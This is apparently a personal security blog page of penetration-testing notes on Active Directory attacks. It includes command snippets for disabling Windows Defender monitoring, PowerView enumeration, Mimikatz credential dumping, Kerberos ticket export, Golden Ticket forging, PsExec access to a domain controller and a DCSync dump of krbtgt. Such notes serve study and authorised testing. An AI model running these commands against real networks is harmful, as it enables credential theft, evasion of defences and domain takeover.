<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Active Directory Exploitation | J Laratro</title>
    <link rel="stylesheet" href="../../css/main.css">
    <link rel="stylesheet" href="../../css/effects.css">
    <link rel="stylesheet" href="../../css/pages.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        .blog-post-content { max-width: 900px; margin: 0 auto; }
        .blog-post-header { margin-bottom: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border-color); }
        .blog-post-title { font-family: var(--font-display); font-size: 2rem; color: var(--text-primary); margin-bottom: 1rem; }
        .blog-post-meta { display: flex; gap: 2rem; flex-wrap: wrap; font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-muted); }
        .blog-post-body { font-size: 1rem; line-height: 1.8; color: var(--text-secondary); }
        .blog-post-body h2 { font-family: var(--font-display); font-size: 1.5rem; color: var(--accent-blue); margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border-color); }
        .blog-post-body h3 { font-family: var(--font-display); font-size: 1.2rem; color: var(--text-primary); margin: 2rem 0 1rem; }
        .blog-post-body h4 { font-family: var(--font-display); font-size: 1rem; color: var(--accent-green); margin: 1.5rem 0 0.75rem; }
        .blog-post-body p { margin-bottom: 1rem; }
        .blog-post-body pre { background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0 1.5rem; font-family: var(--font-mono); font-size: 0.85rem; line-height: 1.5; }
        .blog-post-body code { background: var(--bg-tertiary); padding: 0.2rem 0.4rem; border-radius: 3px; font-family: var(--font-mono); font-size: 0.9em; color: var(--accent-green); }
        .blog-post-body pre code { background: transparent; padding: 0; }
        .blog-post-body ul, .blog-post-body ol { margin: 1rem 0 1.5rem 1.5rem; }
        .blog-post-body li { margin-bottom: 0.5rem; }
        .blog-post-body a { color: var(--accent-blue); text-decoration: none; }
        .blog-post-body a:hover { text-decoration: underline; }
        .blog-tags { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem; }
        .blog-tag { font-family: var(--font-mono); font-size: 0.75rem; padding: 0.3rem 0.6rem; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 4px; color: var(--accent-blue); }
        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; font-family: var(--font-mono); font-size: 0.9rem; color: var(--text-muted); text-decoration: none; margin-bottom: 2rem; transition: var(--transition-normal); }
        .back-link:hover { color: var(--accent-blue); }
        .technique-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
        .technique-card h3 { margin-top: 0; color: var(--accent-red); }
        .resource-list { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
        .resource-list h4 { color: var(--accent-blue); margin-top: 0; }
    </style>
</head>
<body>
    <!-- CRT Effect -->
    <div class="crt"></div>

    <!-- Grid Background -->
    <div class="grid-bg"></div>

    <!-- Classification Bar -->
    <div class="class-bar"></div>

    <!-- Tactical Frame -->
    <div class="tactical-frame"></div>
    <div class="tactical-frame-bottom"></div>

    <!-- Navigation -->
    <nav class="cyber-nav">
        <div class="nav-container">
            <div style="display: flex; align-items: center;">
                <a href="../../index.html" class="nav-logo">
                    <span class="logo-bracket">[</span>
                    <span class="logo-text">JL</span>
                    <span class="logo-bracket">]</span>
                </a>
                <span class="logo-tag">CYBER OPS</span>
            </div>
            <div class="nav-links">
                <a href="../../index.html" class="nav-link">./home</a>
                <a href="../about.html" class="nav-link">./whoami</a>
                <a href="../cyber-projects.html" class="nav-link">./cyberops</a>
                <a href="../projects.html" class="nav-link">./research</a>
                <a href="../blog.html" class="nav-link active">./intel</a>
                <a href="../contact.html" class="nav-link">./comms</a>
            </div>
            <button class="nav-toggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="page-content">
        <div class="blog-post-content">
            <a href="../blog.html" class="back-link">&larr; Back to Blog</a>

            <article>
                <header class="blog-post-header">
                    <h1 class="blog-post-title">Active Directory Exploitation</h1>
                    <div class="blog-post-meta">
                        <span>Type: Technical Notes</span>
                        <span>Category: Active Directory</span>
                    </div>
                    <div class="blog-tags">
                        <span class="blog-tag">Active Directory</span>
                        <span class="blog-tag">Pass-The-Hash</span>
                        <span class="blog-tag">Kerberoasting</span>
                        <span class="blog-tag">Mimikatz</span>
                        <span class="blog-tag">BloodHound</span>
                    </div>
                </header>

                <div class="blog-post-body">
                    <h2>AD: General Pathways</h2>
                    <p>A few of the many exploitation pathways:</p>
                    <ul>
                        <li>Exploiting a web-app --> lateral movement throughout the network --> domain compromise</li>
                        <li>Exploiting a network/service vulnerability --> lateral movement throughout the network --> domain compromise</li>
                        <li>Exploiting a client-side attack to compromise a user --> lateral movement --> domain compromise</li>
                    </ul>

                    <h3>Attack Methods</h3>
                    <ul>
                        <li>Pass-The-Hash</li>
                        <li>Pass-The-Ticket</li>
                        <li>Overpass-The-Hash</li>
                        <li>Kerberoasting</li>
                        <li>AS-REP Roasting</li>
                        <li>Golden Ticket</li>
                        <li>Silver Ticket</li>
                        <li>Password Spraying</li>
                    </ul>

                    <h2>AD: Enumeration and Assessment</h2>
                    <p>After gaining access to a machine within an AD network, it is essential to enumerate the environment and understand the network, the domain, the machines within it, and where the compromised machine stands in relation to the environment (permissions, groups, routes to admin, etc.).</p>

                    <p>Enumeration of AD can be done in various ways. Popular and useful tools include sharphound/bloodhound, powerview, impacket, and powershell.</p>

                    <div class="resource-list">
                        <h4>Useful Resources</h4>
                        <ul>
                            <li><a href="https://wadcoms.github.io/" target="_blank">WADComs</a></li>
                            <li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview" target="_blank">Active Directory Enumeration with PowerView</a></li>
                            <li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank">HackTricks - AD Methodology</a></li>
                        </ul>
                    </div>

                    <h2>Tools</h2>
                    <ul>
                        <li><strong>Impacket suite:</strong> psexec.py, wmiexec.py, smbexec.py</li>
                        <li>crackmapexec</li>
                        <li>powerview</li>
                        <li>sharphound / bloodhound</li>
                        <li>mimikatz</li>
                        <li>pypykatz</li>
                        <li>winpeas / windows privescheck</li>
                        <li>ldapmonitor</li>
                        <li>responder</li>
                        <li>rubeus</li>
                        <li>kerbrute</li>
                    </ul>

                    <div class="technique-card">
                        <h3>PowerView Commands</h3>
                        <h4>Disable Monitoring:</h4>
                        <pre><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>

                        <h4>Get Domain Info:</h4>
                        <pre><code>Get-Domain
Get-DomainController
Get-Domain -Domain domain.local
Get-DomainController -Domain domain.local
Get-DomainUser
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess"
Invoke-ShareFinder
Invoke-MapDomainTrust</code></pre>
                    </div>

                    <div class="technique-card">
                        <h3>Using BloodHound</h3>
                        <p>Workflow: File transfer --> download sharphound --> exfiltrate the data --> view data in bloodhound --> identify valuable accounts or pathways within the domain --> use relevant tools to exploit those accounts and move laterally</p>

                        <h4>Run SharpHound:</h4>
                        <pre><code>.\sharphound.exe -c Default, GPOLocalGroup, LoggedOn --zipfilename output</code></pre>
                    </div>

                    <div class="technique-card">
                        <h3>Mimikatz - Find Vulnerable Accounts</h3>
                        <pre><code>privilege::debug

sekurlsa::logonPasswords</code></pre>
                    </div>

                    <div class="technique-card">
                        <h3>Pass the Ticket Example</h3>
                        <h4>Identify service principals:</h4>
                        <p>Use <code>Get-UserSPNs.ps1</code></p>

                        <h4>Request ticket for vulnerable SPN (PowerShell method):</h4>
                        <pre><code>Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN'</code></pre>

                        <h4>Mimikatz method (example - SPN is mssqlserver):</h4>
                        <pre><code>kerberos::purge
kerberos::list
kerberos::ask /target:mssqlserver
kerberos::list /export</code></pre>

                        <h4>Golden Ticket:</h4>
                        <pre><code>kerberos::golden /user:admin /domain:corp.com /sid:S-1-5-21-xxx-xxxx-xxxxx /target:domain.com /service:MSSQLServer /rc4:hash /ptt</code></pre>
                    </div>

                    <div class="technique-card">
                        <h3>Accessing the DC with Admin Privileges</h3>
                        <pre><code>PsExec64.exe \\domain-dc01\ cmd.exe</code></pre>
                        <pre><code>pushd \\domain-dc01\c$
cd \\domain-dc01\c$</code></pre>

                        <h4>DCSync Attack:</h4>
                        <pre><code>lsaDump::dcsync /user:krbtgt

lsadump::lsa /inject /name:krbtgt</code></pre>
                    </div>

                </div>
            </article>
        </div>
    </main>

    <!-- Footer -->
    <footer class="cyber-footer">
        <div class="footer-content">
            <div class="footer-status">
                <span class="footer-dot"></span>
                <span>SYSTEMS ONLINE</span>
            </div>
            <div class="footer-links">
                <a href="https://github.com/jeremylaratro" target="_blank" class="footer-link">[GitHub]</a>
                <a href="https://www.linkedin.com/in/JeremyLaratro" target="_blank" class="footer-link">[LinkedIn]</a>
            </div>
            <div class="footer-copy">
                &copy; <span id="year"></span> // Secure Channel
            </div>
        </div>
    </footer>

    <script src="../../js/main.js"></script>
</body>
</html>
